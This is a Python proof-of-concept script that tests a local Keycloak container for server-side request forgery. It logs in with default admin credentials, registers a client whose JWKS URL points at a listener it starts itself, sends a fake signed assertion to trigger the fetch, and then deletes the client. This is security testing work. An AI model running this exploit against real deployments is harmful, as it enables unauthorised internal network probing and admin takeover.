import json, urllib.request, urllib.parse, urllib.error, threading
import http.server, time

class HitLogger(http.server.BaseHTTPRequestHandler):
    hits = []
    def do_GET(self):
        HitLogger.hits.append(self.path)
        self.send_response(200)
        self.send_header("Content-Type","application/json")
        self.end_headers()
        self.wfile.write(b'{"keys":[]}')
    def log_message(self,*a): pass

srv = http.server.HTTPServer(("0.0.0.0", 9001), HitLogger)
threading.Thread(target=srv.serve_forever, daemon=True).start()

BASE = "http://localhost:8080"

def get_admin_token():
    data = urllib.parse.urlencode({
        "grant_type":"password","client_id":"admin-cli",
        "username":"admin","password":"admin"
    }).encode()
    r = urllib.request.urlopen(
        urllib.request.Request(
            f"{BASE}/realms/master/protocol/openid-connect/token", data))
    return json.loads(r.read())["access_token"]

def api(method, path, body=None):
    tok = get_admin_token()
    h = {"Authorization":f"Bearer {tok}","Content-Type":"application/json"}
    req = urllib.request.Request(
        f"{BASE}{path}",
        json.dumps(body).encode() if body else None,
        h, method=method)
    try:
        resp = urllib.request.urlopen(req)
        raw = resp.read()
        print(f"  {method} {path} → HTTP {resp.status}")
        return json.loads(raw) if raw else {}
    except urllib.error.HTTPError as e:
        raw = e.read()
        print(f"  {method} {path} → HTTP {e.code}: {raw[:200]}")
        return {"error": e.code, "body": raw.decode()}

# Register client with jwks_uri pointing at listener
client = {
    "clientId": "jwks-ssrf-test",
    "enabled": True,
    "clientAuthenticatorType": "client-jwt",
    "attributes": {
        "jwks.url": "http://host.docker.internal:9001/jwks-probe",
        "use.jwks.url": "true"
    },
    "serviceAccountsEnabled": True
}
print("Creating client...")
result = api("POST", "/admin/realms/master/clients", client)
print(f"Create result: {result}")

# Find the client ID
time.sleep(1)
clients = api("GET", "/admin/realms/master/clients?clientId=jwks-ssrf-test")
if not clients or "error" in clients:
    print("ERROR: Could not find client")
    srv.shutdown()
    exit(1)
client_uuid = clients[0]["id"]
print(f"Client UUID: {client_uuid}")

# Get client secret (for confidential client_assertion)
secret_resp = api("GET", f"/admin/realms/master/clients/{client_uuid}/client-secret")
print(f"Secret: {secret_resp}")

# Trigger JWKS fetch with client_assertion
HitLogger.hits.clear()
print("\nTriggering JWKS fetch via client_assertion...")
token_data = urllib.parse.urlencode({
    "grant_type": "client_credentials",
    "client_id": "jwks-ssrf-test",
    "client_assertion_type":
        "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
    "client_assertion": "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJqd2tzLXNzcmYtdGVzdCIsImlzcyI6Imp3a3Mtc3NyZi10ZXN0IiwiYXVkIjoiaHR0cDovL2xvY2FsaG9zdDo4MDgwL3JlYWxtcy9tYXN0ZXIiLCJleHAiOjk5OTk5OTk5OTl9.fake"
}).encode()

try:
    urllib.request.urlopen(
        urllib.request.Request(
            f"{BASE}/realms/master/protocol/openid-connect/token",
            token_data), timeout=10)
except Exception as e:
    print(f"Token request result: {e}")

time.sleep(3)
print(f"\njwks_uri SSRF hits: {HitLogger.hits}")
if HitLogger.hits:
    print("SSRF CONFIRMED — Keycloak fetched jwks_uri")
else:
    print("No hit — checking why...")
    import subprocess
    logs = subprocess.run(
        ["docker","logs","keycloak-dev","--tail","20"],
        capture_output=True, text=True).stdout
    print("Container logs:", logs[-500:])

# Cleanup
api("DELETE", f"/admin/realms/master/clients/{client_uuid}")
print("Cleaned up")
srv.shutdown()
